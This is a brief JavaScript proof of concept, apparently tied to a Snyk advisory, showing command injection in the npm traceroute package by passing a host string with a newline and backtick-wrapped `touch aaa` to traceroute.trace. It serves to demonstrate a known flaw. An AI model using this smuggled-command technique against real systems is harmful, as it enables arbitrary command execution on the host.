//https://snyk.io/vuln/npm:traceroute:20160311
traceroute = require('traceroute');

host = '127.0.0.1\n `touch aaa`';

traceroute.trace(host, function (err,hops) {});